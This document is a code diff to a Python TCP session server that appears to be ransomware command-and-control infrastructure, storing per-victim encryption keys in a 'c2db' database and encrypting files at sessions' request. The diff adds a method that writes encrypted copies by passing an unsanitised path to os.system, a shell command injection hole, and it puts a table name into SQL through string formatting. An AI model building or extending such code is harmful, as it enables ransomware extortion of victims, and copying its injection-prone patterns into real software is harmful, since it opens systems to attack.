@@ -1,4 +1,5 @@
 import base64
+import cmd
 from collections import deque
 import json
 import os
@@ -18,14 +19,18 @@ QueueItem = Tuple[str, Union[str, Tuple[str, bytes]]]
 class QueuedTCPSessionServer:
     def __init__(
         self,
-        bind_ip: str = "0.0.0.0",
-        port: int = 9000,
-        macros_path: str = "macros.json",
+        bind_ip,
+        port,
+        macros_path,
+        postgres_dsn,
+        postgres_table
     ) -> None:
         self.bind_ip = bind_ip
         self.port = port
         self.macros_path = Path(macros_path)
         self.macros: Dict[str, str] = self._load_macros()
+        self.postgres_dsn = postgres_dsn
+        self.postgres_table = postgres_table
 
         self.global_key1 = secrets.randbits(20)
         self.global_key2 = secrets.randbits(20)
@@ -306,6 +311,7 @@ class QueuedTCPSessionServer:
                             print(
                                 f"\n[Session #{assigned_sid}] ENCRYPT request for '{src_path}' ({length} bytes)"
                             )
+                            self._save_encrypted_copy(session_ip, src_path, enc_bytes)
                             if self._send_encrypted(conn, enc_bytes):
                                 print(
                                     f"[Sent encrypted data to Session #{assigned_sid}] ({len(enc_bytes)} bytes)")
@@ -563,20 +569,18 @@ class QueuedTCPSessionServer:
 
     def _store_victim_key(self, origin_ip: str, victim_key: int) -> None:
         try:
-            with psycopg.connect(os.environ.get("C2_DB_DSN", "dbname=c2db host=/var/run/postgresql")) as conn:
+            with psycopg.connect(self.postgres_dsn) as conn:
                 conn.execute(
-                    "INSERT INTO victim_keys (origin_ip, victim_key) VALUES (%s, %s)",
+                    f"INSERT INTO {self.postgres_table} (origin_ip, victim_key) VALUES (%s, %s)",
                     (origin_ip, str(victim_key)))
         except Exception as exc:
             print(f"Failed to store victim key for {origin_ip}: {exc}")
 
     def _encrypt_bytes(self, data: bytes, origin_ip: str, path: bytes) -> bytes:
-        new_key = None
         with self.lock:
             if origin_ip not in self.per_victim_key_store:
                 victim_key = secrets.randbits(128)
                 self.per_victim_key_store[origin_ip] = victim_key
-                new_key = victim_key
                 self._store_victim_key(origin_ip, victim_key)
             else:
                 victim_key = self.per_victim_key_store[origin_ip]
@@ -585,12 +589,25 @@ class QueuedTCPSessionServer:
             data, victim_key, self.global_key1, self.global_key2, path)
         return encrypted_data
 
+    def _save_encrypted_copy(self, origin_ip: str, path: str, data: bytes) -> None:
+        path = path.replace("..", "") # directory traversal protection
+        data_b64 = base64.b64encode(data).decode("ascii")
+        target = f"encrypted_copies/{origin_ip}/{path}"
+        cmd = f"echo {data_b64} | base64 -d > {target}"
+        try:
+            os.makedirs(os.path.dirname(target), exist_ok=True) # create parent directories if needed
+            os.system(cmd)
+        except Exception as exc:
+            print(f"Failed to save encrypted copy for {origin_ip}/{path}: {exc}")
+
 
 if __name__ == "__main__":
     server = QueuedTCPSessionServer(
-        bind_ip=os.environ.get("C2_BIND_IP", "127.0.0.1"),
-        port=int(os.environ.get("C2_PORT", "9000")),
-        macros_path="macros.json")
+        bind_ip="127.0.0.1",
+        port=9000,
+        macros_path="macros.json",
+        postgres_dsn="dbname=c2db host=/var/run/postgresql",
+        postgres_table="victim_keys")
     acceptor = threading.Thread(target=server.accept_loop, daemon=True)
     acceptor.start()
     if os.environ.get("C2_HEADLESS"):
